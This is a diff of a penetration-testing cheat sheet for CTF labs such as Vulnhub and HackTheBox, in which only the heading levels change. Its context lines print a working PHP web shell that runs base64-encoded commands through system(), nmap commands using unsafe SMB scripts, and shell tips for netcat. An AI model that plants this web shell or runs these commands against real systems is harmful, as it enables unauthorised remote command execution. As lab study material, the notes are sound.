@@ -35,7 +35,7 @@
     - Process of elimination
   - Document everything
 
-<h4>General Stuff</h4>
+<h3>General Stuff</h3>
 
 - Wireshark
   - Set to specific interface
@@ -62,7 +62,7 @@
   - ```nmap -p- --script shodan-api --script-args 'shodan-api.apikey=STICKFISH-API-KEY' 10.10.10.10 -vv```
   - ```nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.10 -vv```
 
-<h4>Port notes Ive collected (Vulnhub & HTB) </h4>
+<h3>Port notes Ive collected (Vulnhub & HTB) </h3>
 
   - Port 21
     - Banner grabbing
@@ -157,7 +157,7 @@
     
   - Other Ports to follow...
   
-<H4>Getting In</H4>
+<H3>Getting In</H3>
 
 - Put this at top because its handy as balls
   - ```<?php if(isset($_REQUEST["cli"])){ echo "<pre>"; $cli = base64_decode(urldecode(($_REQUEST["cli"]))); system($cli); echo "</pre>"; die; }?>```
@@ -265,7 +265,7 @@
     - ```C:\\Windows\\System32\\cmd.exe /c cmd.exe``` (Not exactly a rev shell but usefull with NC sometimes)
     - Full PHP reverse shell from Pentest Monkey is brilliant (Edit IP & Port)
     
-<H4>Linux</H4>
+<H3>Linux</H3>
 
 - Low priv / Priv esc (Gotm1lk is a legend in this regard)
   - Paths
@@ -324,7 +324,7 @@
     - .bak files can be fun!!
     - .old
 
-<H4>Windows</H4>
+<H3>Windows</H3>
   
   **A must https://www.fuzzysecurity.com/tutorials/16.html **
   
